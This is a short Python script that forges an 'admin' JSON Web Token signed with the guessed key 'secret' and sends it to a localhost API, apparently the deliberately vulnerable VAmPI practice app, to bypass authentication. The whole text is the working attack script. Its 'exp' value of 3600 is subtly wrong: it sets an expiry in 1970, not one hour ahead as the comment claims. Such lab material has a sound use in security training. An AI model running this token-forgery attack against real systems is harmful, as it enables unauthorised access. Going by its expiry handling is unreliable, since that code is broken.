import jwt
import requests
# Set up the target URL and desired claims for the token
target_url = "http://localhost:5002/api/users"
claims = {
 "sub": "admin", # Subject claim, usually an email or username
 "exp": 3600, # Expiration time in seconds
}
# Generate a malicious JWT token with the desired claims
token = jwt.encode(claims, 'secret', algorithm='HS256')
# Send the token to VAmPI's API endpoint as an Authorization header
response = requests.get(target_url, headers={"Authorization": f"Bearer {token}"})
print(response.text)
